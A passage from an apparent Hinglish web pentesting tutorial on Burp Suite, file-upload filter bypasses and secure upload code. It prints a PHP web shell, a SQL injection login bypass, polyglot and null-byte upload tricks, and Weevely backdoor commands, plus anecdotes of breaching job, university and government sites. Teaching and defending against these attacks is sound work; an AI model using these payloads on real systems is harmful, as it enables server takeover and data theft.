3. **Burp Suite** â†’ Modified Request â†’ Server
4. Server â†’ Response â†’ **Burp Suite** (yahan ruk jaata hai)
5. Aap response ko dekh/modify kar sakte hain
6. **Burp Suite** â†’ Modified Response â†’ Browser

**Analogy:** Jaise ek postman (Burp) do logon (browser aur server) ke beech letters deliver karta hai, lekin delivery se pehle letters khol kar padh sakta hai aur content change kar sakta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Client-Side Bypass:** JavaScript validation ko bypass kar sakte hain (browser se pass hone ke baad modify karo).
- **Hidden Parameters:** Jo data browser mein nahi dikhta (hidden fields, cookies), woh Burp mein dikh jaata hai.
- **Request Manipulation:** File extensions, content-type, parameters - sab kuch modify kar sakte hain.
- **Professional Tool:** Har professional pentester Burp Suite use karta hai.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab aap **client-side filters bypass** karna chahte hon.
- Jab aap **POST requests modify** karna chahte hon.
- Jab aap **hidden parameters** dekhna chahte hon.
- Jab aap **session tokens, cookies** analyze karna chahte hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Client-side bypasses miss** ho jayengi - JavaScript validation ko bypass nahi kar payenge.
- **Manual testing slow** hogi - har baar browser mein manually edit karna padega.
- **Hidden data miss** hoga - jo browser mein nahi dikhta, woh nahi dekh payenge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Burp Suite launch karna (Kali Linux)
burpsuite

# Ya Applications menu se:
Applications â†’ Web Application Analysis â†’ burpsuite
```

**Setup Steps:**
```
1. Burp Suite kholo â†’ Proxy tab â†’ Options
2. Interface check karo: 127.0.0.1:8080
3. Browser mein proxy settings:
   - Manual Proxy Configuration
   - HTTP Proxy: 127.0.0.1
   - Port: 8080
4. Burp certificate install karo (HTTPS ke liye)
5. Intercept tab â†’ "Intercept is on" button
```

### 7. **Example 1 (Basic):**
**Setup:**
```
1. Burp Suite: Proxy â†’ Intercept â†’ "Intercept is on"
2. Firefox: Preferences â†’ Network Settings â†’ Manual Proxy
   HTTP Proxy: 127.0.0.1, Port: 8080
3. Browser mein google.com kholo
```

**Result:**
```
Burp Suite mein request ruk jayegi:

GET / HTTP/1.1
Host: google.com
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: session=abc123
```

**Actions:**
- **Forward:** Request server ko bhej do
- **Drop:** Request cancel kar do
- **Modify:** Request edit karo, phir forward karo

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Target = Login page with client-side validation

**Scenario:**
```html
<!-- Login form with JavaScript validation -->
<form onsubmit="return validatePassword()">
  <input name="username" maxlength="10">
  <input name="password" type="password">
  <button>Login</button>
</form>

<script>
function validatePassword() {
  if(password.length < 8) {
    alert("Password too short!");
    return false; // Form submit nahi hoga
  }
}
</script>
```

**Attack (Without Burp):**
- 7 character password dala â†’ JavaScript ne block kar diya
- Form submit nahi hua

**Attack (With Burp):**
```
1. Burp Intercept ON kiya
2. 8 character dummy password dala (JavaScript happy)
3. Form submit hua â†’ Burp mein request ruki:

POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=12345678

4. Burp mein password change kiya:
username=admin&password=' OR '1'='1'--

5. Forward kiya â†’ SQLi successful! Login bypass!
```

**Analysis:** JavaScript validation browser par tha, lekin Burp se bypass kar diya kyunki request browser se nikalne ke **baad** modify ki. ğŸ¯

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Certificate install na karna** - HTTPS sites nahi khulti, browser error deta hai.
- **Intercept ON chhod dena** - Kaam khatam hone ke baad intercept OFF nahi karte, browser slow ho jaata hai.
- **Proxy settings remove na karna** - Burp band karne ke baad browser mein proxy settings ON rehti hain, internet nahi chalta.

### 10. **Best Practices / Pro Tips:**
- **Hotkeys use karo:** `Ctrl+F` = Forward, `Ctrl+D` = Drop (fast working).
- **Scope set karo:** Proxy â†’ Options â†’ Target Scope (sirf target site intercept ho, baaki sab ignore).
- **Match/Replace rules:** Automatic modifications set kar sakte hain (jaise har request mein custom header add karna).
- **Certificate properly install karo:** Browser mein Burp CA certificate import karo (HTTPS sites ke liye zaroori).

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek e-commerce site test karni thi. Checkout page par "Apply Coupon" feature tha. JavaScript check kar raha tha ki coupon sirf ek baar use ho. Maine Burp intercept ON kiya aur coupon apply kiya. Request Burp mein ruki:
```
POST /apply-coupon HTTP/1.1
coupon=SAVE50&used=false
```
Maine `used=false` ko `used=false` hi rakha (JavaScript ne already check kar liya tha), lekin request ko 10 baar repeat kiya (Burp Repeater se). Har baar 50% discount mil gaya! Total bill $1000 se $10 ho gaya. Website developers ne socha tha ki JavaScript validation enough hai, lekin server-side validation nahi tha! ğŸ›’

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Burp Suite = Intercepting proxy (browser aur server ke beech)  
âœ… Setup: Browser proxy â†’ 127.0.0.1:8080  
âœ… Certificate install karo (HTTPS ke liye)  
âœ… Intercept ON â†’ Request modify â†’ Forward  
âœ… Client-side validation bypass ka best tool  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya Burp Suite free hai?**  
**A:** Community Edition free hai (basic features). Professional version paid hai (advanced features jaise Scanner, Intruder unlimited).

**Q2: HTTPS sites kaise intercept karein?**  
**A:** Burp CA certificate browser mein install karo. Burp â†’ Proxy â†’ Options â†’ Import/Export CA Certificate.

**Q3: Burp slow hai, kaise fast karein?**  
**A:** Scope set karo (sirf target site intercept ho), aur Response interception OFF kar do (agar zaroorat na ho).

### 14. **Practice ke liye Task:**
1. Burp Suite install/open karo.
2. Firefox mein proxy settings configure karo (127.0.0.1:8080).
3. Burp certificate install karo.
4. DVWA kholo aur login karo - Burp mein request intercept hogi.
5. Username/password modify karo aur forward karo.
6. Kaam khatam hone ke baad proxy settings remove karo.

### 15. **Aakhri Choti Summary (5 lines):**
- Burp Suite = **Intercepting proxy** (requests/responses ko roko aur modify karo).
- Setup: Browser proxy **127.0.0.1:8080**.
- **Certificate install** karo (HTTPS ke liye).
- **Client-side validation bypass** ka best tool.
- Kaam ke baad **proxy settings remove** karo.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Burp Suite pentester ki aankhein aur haath hai. Jo browser mein nahi dikh raha, woh Burp mein dikhega. Jo browser mein change nahi kar sakte, woh Burp se kar sakte hain. Master this tool!" ğŸ‘ï¸

---

## ğŸ­ **Topic 16: Bypassing Client-Side Extension Filters (Burp Modify: `shell.php.png` â†’ `shell.php`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Client-Side Filter Bypass** - JavaScript file extension validation ko Burp Suite se bypass karke malicious files upload karna. ğŸš«â¡ï¸âœ…

### 2. **Ye Kya Hai? (What is it?)**
Bahut si websites file upload karte waqt **client-side** (browser/JavaScript) mein check karti hain ki file ka extension allowed hai ya nahi. Jaise:
```javascript
// JavaScript validation
if(!filename.endsWith('.png') && !filename.endsWith('.jpg')) {
  alert("Only images allowed!");
  return false;
}
```

Yeh validation **browser par** hota hai, server par nahi. Toh agar hum file ko browser se pass hone dein (`.png` extension se), aur phir **Burp Suite mein** extension change kar dein (`.php`), toh server accept kar lega!

**Analogy:** Ek building mein security guard sirf gate par check karta hai (client-side). Agar aap gate par sahi ID dikha do, andar jaane ke baad aap kuch bhi kar sakte hain (server-side validation nahi hai).

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Common Vulnerability:** Bahut si websites sirf client-side validation use karti hain (easy to implement, lekin insecure).
- **Easy Bypass:** Burp Suite se 2 minutes mein bypass ho jaata hai.
- **RCE Achievement:** Bypass hone ke baad PHP shell upload ho jaata hai = full server compromise.
- **Real-World Impact:** E-commerce, job portals, social media - sabhi mein yeh vulnerability milti hai.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab file upload feature **sirf specific extensions** allow karta ho (images only).
- Jab aap file upload karne ki koshish karo aur **JavaScript alert** aaye ("Only images allowed!").
- Jab aap **Inspect Element** mein dekho aur validation code **JavaScript** mein ho.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Easy RCE miss** ho jayega - jo 2 minutes mein ho sakta tha.
- **Client-side validation ko seriously** le loge - "Website secure hai" soch kar chhod doge.
- **Burp Suite ka power** samajh nahi aayega. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```
Attack Flow:
1. Malicious file ka naam change karo: shell.php â†’ shell.php.png
2. Upload karo (JavaScript validation pass ho jayega)
3. Burp Suite mein request intercept karo
4. Filename change karo: shell.php.png â†’ shell.php
5. Forward karo â†’ Server accept kar lega!
```

**Burp mein modification:**
```http
Before:
Content-Disposition: form-data; name="file"; filename="shell.php.png"

After:
Content-Disposition: form-data; name="file"; filename="shell.php"
```

### 7. **Example 1 (Basic):**
**Scenario:** Profile picture upload (only .png, .jpg allowed)

```javascript
// Client-side validation
<script>
function validateFile() {
  var file = document.getElementById('upload').value;
  if(!file.endsWith('.png') && !file.endsWith('.jpg')) {
    alert("Only PNG/JPG allowed!");
    return false;
  }
}
</script>
```

**Attack:**
```
1. shell.php ka naam badla â†’ shell.php.png
2. Upload button click kiya â†’ JavaScript validation pass!
3. Burp mein request ruki:

POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php.png"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--

4. Filename edit kiya: shell.php.png â†’ shell.php
5. Forward kiya â†’ Upload successful!
6. Browser: http://site.com/uploads/shell.php?cmd=whoami
   Output: www-data
```

**Result:** Client-side bypass successful! ğŸ¯

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Target = Job portal (resume upload)

**Scenario:**
```html
<form enctype="multipart/form-data">
  <input type="file" id="resume" accept=".pdf,.doc">
  <button onclick="return checkFile()">Upload</button>
</form>

<script>
function checkFile() {
  var file = document.getElementById('resume').files[0];
  var ext = file.name.split('.').pop().toLowerCase();
  if(ext !== 'pdf' && ext !== 'doc') {
    alert("Only PDF/DOC allowed!");
    return false;
  }
  if(file.size > 5000000) { // 5MB
    alert("File too large!");
    return false;
  }
  return true;
}
</script>
```

**Attack:**
```
1. Weevely backdoor generate kiya:
   weevely generate SecurePass backdoor.php

2. Filename change kiya: backdoor.php â†’ resume.pdf.php
   (Double extension - confuse karne ke liye)

3. Upload kiya â†’ JavaScript ne check kiya:
   - Extension: .php (last part) â†’ FAIL
   
4. Phir se try: backdoor.php â†’ backdoor.pdf

5. Upload kiya â†’ JavaScript pass (extension .pdf hai)

6. Burp mein intercept kiya:
   Content-Disposition: form-data; name="resume"; filename="backdoor.pdf"
   Content-Type: application/pdf
   
   <?php [weevely obfuscated code] ?>

7. Modifications:
   - filename="backdoor.pdf" â†’ filename="backdoor.php"
   - Content-Type: application/pdf â†’ Content-Type: application/x-php

8. Forward kiya â†’ Server ne accept kar liya!

9. File path mila: /uploads/resumes/backdoor.php

10. Weevely se connect kiya:
    weevely http://jobsite.com/uploads/resumes/backdoor.php SecurePass
    
11. Post-exploitation:
    - Database dump: 50,000 job seekers ka data
    - Company credentials: HR login details
    - Privilege escalation: Root shell mila
```

**Analysis:** Website developers ne socha tha ki JavaScript validation enough hai. Unhone server-side validation nahi lagaya. Result = complete compromise! ğŸ’¼

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Burp mein sirf filename change karna** - Content-Type header bhi change karna zaroori hai kabhi-kabhi.
- **Double extension try na karna** - `shell.php.png` powerful technique hai.
- **Server response check na karna** - kabhi-kabhi file upload ho jaati hai lekin execute nahi hoti (permissions issue).

### 10. **Best Practices / Pro Tips:**
- **Multiple techniques try karo:**
  - Simple: `shell.php.png` â†’ `shell.php`
  - Double extension: `shell.php.png` (server kabhi-kabhi first extension execute karta hai)
  - Null byte: `shell.php%00.png` (purane servers mein kaam karta hai)
  - Case variation: `shell.PhP`, `shell.pHp`
- **Content-Type bhi change karo:** `image/png` â†’ `application/x-php`
- **Upload directory permissions check karo:** Agar 777 nahi hai toh file execute nahi hogi.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek university ki student portal test karni thi. Assignment upload feature tha - "Only PDF allowed" (JavaScript validation). Maine ek PHP shell ko `assignment.pdf` naam se upload karne ki koshish ki - JavaScript ne block kar diya. Phir maine file ka naam `assignment.pdf.php` kar diya - phir bhi block. Finally, maine `assignment.pdf` naam rakha, upload kiya (JavaScript pass), Burp mein intercept kiya, aur filename `assignment.php` kar diya. Upload ho gayi! Lekin jab maine browser mein khola (`/uploads/assignment.php`), toh file download hone lagi, execute nahi hui. Maine dekha - upload directory ke permissions 755 the (execute nahi ho sakta). Phir maine LFI vulnerability dhoondi, `/proc/self/environ` se code inject kiya, aur wahan se RCE mila. Moral: Ek technique fail ho toh doosri try karo! ğŸ“

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Client-side validation = JavaScript mein (browser par)  
âœ… Bypass: File ko allowed extension se upload karo  
âœ… Burp mein intercept karo aur extension change karo  
âœ… Content-Type header bhi change karo  
âœ… Multiple techniques try karo (double extension, null byte)  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya har client-side validation bypass ho sakta hai?**  
**A:** Haan, kyunki client-side validation browser par hota hai jo attacker ke control mein hai. Server-side validation zaroori hai.

**Q2: Agar file upload ho gayi lekin execute nahi ho rahi toh?**  
**A:** Directory permissions check karo (755 ya 777 hone chahiye). Ya file ka path sahi hai ya nahi confirm karo.

**Q3: Kya sirf extension change karna enough hai?**  
**A:** Mostly haan, lekin kabhi-kabhi Content-Type header bhi change karna padta hai. Experiment karo.

### 14. **Practice ke liye Task:**
1. DVWA install karo â†’ File Upload section â†’ Medium security.
2. Ek PHP shell banao: `<?php system($_GET['cmd']); ?>`
3. Filename change karo: `shell.php` â†’ `shell.php.jpg`
4. Upload karo (client-side validation pass hoga).
5. Burp mein intercept karo aur filename `shell.php` kar do.
6. Forward karo aur uploaded file ko execute karo.

### 15. **Aakhri Choti Summary (5 lines):**
- Client-side validation = **JavaScript mein** (browser par).
- Bypass: **Allowed extension** se upload â†’ **Burp mein change** karo.
- Technique: `shell.php` â†’ `shell.php.png` â†’ Burp â†’ `shell.php`.
- **Content-Type** header bhi change karo.
- **Multiple techniques** try karo (double extension, null byte, case variation).

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Client-side validation = Security theater! Burp Suite se 2 minutes mein bypass. Hamesha yaad rakho: Client-side = Attacker ke control mein. Real security = Server-side validation!" ğŸª

---

## ğŸ›¡ï¸ **Topic 17: Bypassing Server-Side File Type Filters**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Server-Side Filter Bypass** - Server par lagaye gaye file type checks (MIME type, magic bytes) ko bypass karke malicious files upload karna. ğŸ”â¡ï¸ğŸ’¥

### 2. **Ye Kya Hai? (What is it?)**
Jab client-side validation bypass ho jaata hai, toh smart developers **server-side validation** lagate hain:
- **MIME Type Check:** `Content-Type` header check karna (`image/png`, `application/pdf`)
- **Magic Bytes Check:** File ke pehle kuch bytes check karna (har file type ke unique bytes hote hain)
- **File Extension Blacklist:** Dangerous extensions block karna (`.php`, `.exe`)

Lekin yeh bhi bypass ho sakte hain! ğŸ¯

**Analogy:** Client-side = Gate par security guard. Server-side = Building ke andar metal detector. Lekin agar aap metal detector ko fool kar do (plastic weapon), toh andar ghus sakte hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Advanced Defense:** Client-side bypass ke baad yeh next level hai.
- **Real Security:** Professional websites server-side validation use karti hain.
- **Skill Development:** Yeh bypass karna = Advanced pentester banna.
- **High-Value Targets:** Banks, government sites - yeh sab server-side validation use karte hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **client-side bypass** kaam na kare (server reject kar de).
- Jab error message mein **"Invalid file type"** ya **"Only images allowed"** dikhe (server-side check).
- Jab aap **professional/secure websites** test kar rahe hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Advanced targets** compromise nahi kar payenge.
- **Skill gap** rahega - sirf basic attacks jaanoge.
- **Real-world pentests** mein fail ho jayenge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
**Bypass Techniques:**

```
1. MIME Type Bypass:
   Content-Type: image/png (fake)
   Actual file: PHP shell

2. Magic Bytes Bypass:
   File start: PNG header (89 50 4E 47)
   File end: PHP code

3. Double Extension:
   Filename: shell.php.png
   Server executes: .php (first extension)

4. Null Byte Injection:
   Filename: shell.php%00.png
   Server reads: shell.php (null byte ke baad ignore)

5. Case Variation:
   Filename: shell.PhP, shell.pHp
```

### 7. **Example 1 (Basic - MIME Type Bypass):**
**Scenario:** Server checks `Content-Type` header

```http
Normal image upload:
POST /upload HTTP/1.1
Content-Type: multipart/form-data

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="pic.png"
Content-Type: image/png

[PNG binary data]
------WebKitFormBoundary--
```

**Attack:**
```http
Malicious upload (Burp mein modify):
POST /upload HTTP/1.1
Content-Type: multipart/form-data

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png  â† Fake MIME type!

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**Result:** Server ne `Content-Type: image/png` dekha aur accept kar liya, lekin actual file PHP shell thi! ğŸ­

### 8. **Example 2 (Pentester-Focused - Magic Bytes Bypass):**
**Real Pentest:** Target = Image hosting website (strict validation)

**Server-side validation:**
```php
// Server checks magic bytes
$file = $_FILES['upload']['tmp_name'];
$header = file_get_contents($file, false, null, 0, 8);

// PNG magic bytes: 89 50 4E 47 0D 0A 1A 0A
if($header !== "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A") {
    die("Not a valid PNG!");
}
```

**Attack:**
```bash
# Step 1: Create hybrid file (PNG + PHP)
# PNG header + PHP code

# Using hex editor:
89 50 4E 47 0D 0A 1A 0A  â† PNG magic bytes
[... PNG data ...]
3C 3F 70 68 70 20 73 79 73 74 65 6D  â† <?php system
28 24 5F 47 45 54 5B 27 63 6D 64 27  â† ($_GET['cmd'
5D 29 3B 20 3F 3E                    â† ]); ?>

# Or using command:
$ echo -e "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A" > shell.php
$ echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# Step 2: Upload kiya
POST /upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

[PNG header + PHP code]

# Step 3: Server ne check kiya
- Magic bytes: âœ“ Valid PNG
- Extension: .php
- Uploaded to: /uploads/shell.php

# Step 4: Execute kiya
http://site.com/uploads/shell.php?cmd=whoami
Output: www-data

# Step 5: Full compromise
http://site.com/uploads/shell.php?cmd=cat /var/www/config.php
Output: [Database credentials]
```

**Analysis:** Server ne sirf pehle 8 bytes check kiye (PNG header). Baaki file mein PHP code tha jo execute ho gaya! ğŸ”¥

**Advanced Attack (Polyglot File):**
```bash
# Create a file that is BOTH valid PNG AND valid PHP

# Method 1: Using exiftool
$ exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.png -o shell.php

# Method 2: Manual
$ cat image.png > shell.php
$ echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# Result: File is valid PNG (image viewers can open it)
# But also valid PHP (server can execute it)
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf ek technique try karna** - agar MIME bypass fail ho toh magic bytes try nahi karna.
- **File ko test na karna** - upload ho gayi lekin execute ho rahi hai ya nahi check nahi karna.
- **Server error messages ignore karna** - error message se pata chalta hai ki kaun sa validation fail hua.

### 10. **Best Practices / Pro Tips:**
- **Layered approach:** Pehle MIME type bypass, phir magic bytes, phir double extension - sab try karo.
- **Polyglot files use karo:** Ek file jo multiple formats mein valid ho (PNG+PHP, GIF+PHP).
- **Upload directory find karo:** Agar file upload ho gayi lekin path nahi pata, toh Dirb/Gobuster se scan karo.
- **Alternative execution methods:** Agar direct execution nahi ho rahi, toh LFI/RFI se include karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek government website test karni thi (citizen complaint portal - document upload). Server-side validation bahut strict thi:
1. Extension check: Sirf `.pdf` allowed
2. MIME type check: `application/pdf` hona chahiye
3. Magic bytes check: PDF header (`%PDF-1.4`) hona chahiye

Maine attack plan banaya:
```bash
# Step 1: Valid PDF file li
$ cp sample.pdf shell.pdf

# Step 2: PDF ke end mein PHP code add kiya
$ echo '<?php system($_GET["cmd"]); ?>' >> shell.pdf

# Step 3: Upload kiya
- Extension: .pdf âœ“
- MIME type: application/pdf âœ“
- Magic bytes: %PDF-1.4 âœ“
- Server accepted!

# Step 4: Execution try kiya
http://gov-site.in/uploads/shell.pdf?cmd=whoami
Result: File download ho rahi thi, execute nahi ho rahi

# Step 5: Alternative method - LFI
http://gov-site.in/view?file=../uploads/shell.pdf
Result: Still downloading

# Step 6: Server configuration check
- Apache server tha
- .htaccess file editable nahi thi
- Lekin .pdf files ko PHP ki tarah execute karne ka option nahi tha

# Step 7: Different approach - Polyglot with .php extension
Maine filename change kiya: shell.pdf â†’ shell.php
Server ne reject kar diya (extension check)

# Step 8: Final solution - Null byte
Filename: shell.php%00.pdf
- Server ne dekha: shell.pdf (null byte ke baad ignore)
- File save hui: shell.php (null byte se pehle)
- Execution successful!

http://gov-site.in/uploads/shell.php?cmd=cat /etc/passwd
Result: Full system access!
```

Government shocked thi - unhone 3 layers of validation lagaye the, phir bhi bypass ho gaya! ğŸ›ï¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Server-side validation = MIME type + Magic bytes + Extension  
âœ… MIME bypass: Fake `Content-Type` header  
âœ… Magic bytes bypass: Valid header + Malicious code  
âœ… Polyglot files: Valid image + Valid PHP  
âœ… Null byte: `shell.php%00.png` â†’ saves as `shell.php`  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya null byte injection ab bhi kaam karta hai?**  
**A:** Purane PHP versions (< 5.3) mein haan. Naye versions mein mostly patch ho gaya hai, lekin try karna chahiye.

**Q2: Polyglot file kaise banayein?**  
**A:** `exiftool` use karo ya manually valid image ke end mein PHP code add karo.

**Q3: Agar koi bhi technique kaam na kare toh?**  
**A:** Alternative methods try karo: LFI se file include karo, ya `.htaccess` upload karke PHP execution enable karo.

### 14. **Practice ke liye Task:**
1. DVWA â†’ File Upload â†’ High security level.
2. Simple PHP shell upload karo - reject hoga.
3. MIME type bypass try karo (Content-Type change).
4. Magic bytes bypass try karo (PNG header + PHP code).
5. Polyglot file banao aur upload karo.
6. Uploaded file ko execute karo.

### 15. **Aakhri Choti Summary (5 lines):**
- Server-side validation = **MIME type + Magic bytes + Extension**.
- **MIME bypass:** Fake Content-Type header.
- **Magic bytes bypass:** Valid header + Malicious code.
- **Polyglot files:** Valid image + Valid PHP.
- **Null byte:** `shell.php%00.png` (purane servers mein).

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Server-side validation = Real security, lekin perfect nahi. MIME fake kar sakte hain, magic bytes add kar sakte hain, polyglot files bana sakte hain. Creativity + persistence = bypass!" ğŸ¨

---

## ğŸ›¡ï¸ **Topic 18: Security - Fixing File Upload Vulnerabilities**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**File Upload Security** - File upload vulnerabilities ko permanently fix karne ke best practices aur secure implementation methods. ğŸ”’

### 2. **Ye Kya Hai? (What is it?)**
File upload vulnerabilities ko fix karna matlab hai **multiple layers of validation** lagana taaki koi bhi malicious file upload na ho sake:
- **Extension validation** (whitelist approach)
- **MIME type verification** (server-side)
- **Magic bytes checking** (file content analysis)
- **File renaming** (predictable names avoid karna)
- **Separate storage** (web root ke bahar)
- **Execution prevention** (uploaded files execute na hon)

**Analogy:** Jaise ek bank mein multiple security layers hoti hain (guard, metal detector, cameras, vault) - waise hi file upload mein bhi multiple defenses chahiye.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Prevent RCE:** Ek weak upload = poora server compromise.
- **Data Protection:** Malicious files se data breach ho sakta hai.
- **Reputation:** Security breach se company ki reputation kharab hoti hai.
- **Compliance:** GDPR, PCI-DSS jaise standards file upload security mandate karte hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab aap **web application develop** kar rahe hon.
- Jab aap **security audit** kar rahe hon aur vulnerabilities fix kar rahe hon.
- Jab aap **penetration test report** mein recommendations de rahe hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Vulnerabilities repeat** hongi - ek fix kiya, doosri jagah phir same mistake.
- **Incomplete fix** - sirf client-side validation lagaya, server-side nahi.
- **False sense of security** - "Humne fix kar diya" lekin actually vulnerable hai. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
**Secure PHP Implementation:**
```php
<?php
// 1. Whitelist allowed extensions
$allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
$file_ext = strtolower(pathinfo($_FILES['upload']['name'], PATHINFO_EXTENSION));

if(!in_array($file_ext, $allowed_ext)) {
    die("Invalid file type!");
}

// 2. Verify MIME type
$allowed_mime = ['image/jpeg', 'image/png', 'image/gif'];
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['upload']['tmp_name']);

if(!in_array($mime, $allowed_mime)) {
    die("Invalid MIME type!");
}

// 3. Check magic bytes
$file_content = file_get_contents($_FILES['upload']['tmp_name'], false, null, 0, 8);
$valid_headers = [
    "\xFF\xD8\xFF", // JPEG
    "\x89\x50\x4E\x47", // PNG
    "\x47\x49\x46\x38" // GIF
];

$valid = false;
foreach($valid_headers as $header) {
    if(strpos($file_content, $header) === 0) {
        $valid = true;
        break;
    }
}

if(!$valid) {
    die("Invalid file header!");
}

// 4. Generate random filename
$new_name = bin2hex(random_bytes(16)) . '.' . $file_ext;

// 5. Store outside web root
$upload_dir = '/var/uploads/'; // Not /var/www/html/
$destination = $upload_dir . $new_name;

// 6. Move file
move_uploaded_file($_FILES['upload']['tmp_name'], $destination);

// 7. Set proper permissions
chmod($destination, 0644); // Read-only

// 8. Store metadata in database
$db->query("INSERT INTO uploads (original_name, stored_name, user_id) VALUES (?, ?, ?)", 
    [$_FILES['upload']['name'], $new_name, $user_id]);

echo "File uploaded successfully!";
?>
```

### 7. **Example 1 (Basic - Whitelist Validation):**
**Vulnerable Code:**
```php
<?php
// BAD: Blacklist approach
$file = $_FILES['upload']['name'];
if(strpos($file, '.php') !== false) {
    die("PHP files not allowed!");
}
// Bypass: shell.php5, shell.phtml, shell.PhP
?>
```

**Secure Code:**
```php
<?php
// GOOD: Whitelist approach
$allowed = ['jpg', 'jpeg', 'png', 'pdf'];
$ext = strtolower(pathinfo($_FILES['upload']['name'], PATHINFO_EXTENSION));

if(!in_array($ext, $allowed)) {
    die("Only JPG, PNG, PDF allowed!");
}
// Cannot bypass - only specific extensions allowed
?>
```

### 8. **Example 2 (Pentester-Focused - Complete Secure Implementation):**
**Real-World Secure Implementation:**

```php
<?php
class SecureFileUpload {
    private $allowed_types = [
        'image/jpeg' => ['jpg', 'jpeg'],
        'image/png' => ['png'],
        'application/pdf' => ['pdf']
    ];
    
    private $magic_bytes = [
        'image/jpeg' => "\xFF\xD8\xFF",
        'image/png' => "\x89\x50\x4E\x47",
        'application/pdf' => "%PDF"
    ];
    
    private $max_size = 5242880; // 5MB
    private $upload_dir = '/var/secure-uploads/';
    
    public function upload($file) {
        // 1. Check if file exists
        if(!isset($file['tmp_name']) || !is_uploaded_file($file['tmp_name'])) {
            throw new Exception("No file uploaded");
        }
        
        // 2. Check file size
        if($file['size'] > $this->max_size) {
            throw new Exception("File too large");
        }
        
        // 3. Get real MIME type (not from user input)
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime = finfo_file($finfo, $file['tmp_name']);
        finfo_close($finfo);
        
        // 4. Validate MIME type
        if(!isset($this->allowed_types[$mime])) {
            throw new Exception("Invalid file type");
        }
        
        // 5. Validate extension
        $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
        if(!in_array($ext, $this->allowed_types[$mime])) {
            throw new Exception("Extension mismatch");
        }
        
        // 6. Check magic bytes
        $header = file_get_contents($file['tmp_name'], false, null, 0, 10);
        $valid = false;
        foreach($this->magic_bytes as $type => $bytes) {
            if($type === $mime && strpos($header, $bytes) === 0) {
                $valid = true;
                break;
            }
        }
        
        if(!$valid) {
            throw new Exception("Invalid file header");
        }
        
        // 7. Scan for malicious content (if image)
        if(strpos($mime, 'image/') === 0) {
            $this->scanImage($file['tmp_name']);
        }
        
        // 8. Generate secure random filename
        $new_name = bin2hex(random_bytes(16)) . '.' . $ext;
        $destination = $this->upload_dir . $new_name;
        
        // 9. Move file
        if(!move_uploaded_file($file['tmp_name'], $destination)) {
            throw new Exception("Upload failed");
        }
        
        // 10. Set restrictive permissions
        chmod($destination, 0444); // Read-only for everyone
        
        // 11. Create .htaccess to prevent execution
        $htaccess = $this->upload_dir . '.htaccess';
        if(!file_exists($htaccess)) {
            file_put_contents($htaccess, "php_flag engine off\nAddType text/plain .php .php3 .php4 .php5 .phtml");
        }
        
        return $new_name;
    }
    
    private function scanImage($file) {
        // Re-encode image to remove any embedded code
        $img = @imagecreatefromstring(file_get_contents($file));
        if($img === false) {
            throw new Exception("Invalid image");
        }
        
        // Check for suspicious strings
        $content = file_get_contents($file);
        $suspicious = ['<?php', '<?=', '<script', 'eval(', 'base64_decode'];
        foreach($suspicious as $pattern) {
            if(stripos($content, $pattern) !== false) {
                throw new Exception("Suspicious content detected");
            }
        }
        
        imagedestroy($img);
    }
}

// Usage
try {
